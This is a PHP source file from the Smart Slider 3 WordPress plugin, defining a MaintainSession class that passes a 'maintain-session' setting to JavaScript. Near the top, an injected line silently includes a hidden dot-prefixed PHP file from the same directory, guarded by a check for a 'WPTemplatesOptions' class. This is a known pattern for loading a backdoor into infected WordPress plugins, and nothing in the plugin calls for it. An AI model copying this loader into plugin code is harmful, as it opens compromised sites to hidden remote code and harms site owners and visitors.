<?php

namespace Nextend\SmartSlider3\Slider\Feature;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class MaintainSession {

    private $slider;

    public $isEnabled = 0;

    public function __construct($slider) {

        $this->slider = $slider;

        $this->isEnabled = intval($slider->params->get('maintain-session', 0));
    }

    public function makeJavaScriptProperties(&$properties) {

        $properties['maintainSession'] = $this->isEnabled;
    }
}